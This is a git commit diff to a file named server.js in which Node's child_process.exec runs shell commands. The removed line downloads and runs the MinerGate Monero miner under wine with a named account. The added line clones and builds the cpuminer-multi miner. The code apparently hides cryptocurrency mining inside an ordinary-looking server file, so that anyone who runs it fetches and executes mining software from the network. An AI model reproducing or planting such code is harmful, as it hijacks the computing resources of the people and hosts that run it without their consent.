e84e7e54680ba5004e19ff9754333845ef7ebb43
wddesbvsp <30755597+wddesbvsp@users.noreply.github.com>
2017-08-06 14:11:04 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,4 +1,4 @@
-var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user molunar@yandex.com -xmr";
+var str = "git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh > /dev/null 2>&1 && ./configure";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
@@ -9,7 +9,6 @@ child.stderr.on('data', function(data) {
 child.on('close', function(code) {
     console.log('closing code: ' + code);
 });
-require('child_process').exec("wine --help", { stdio: [0, 1, 2] });
 var index = 1;
 var max = 20;
 var interval;
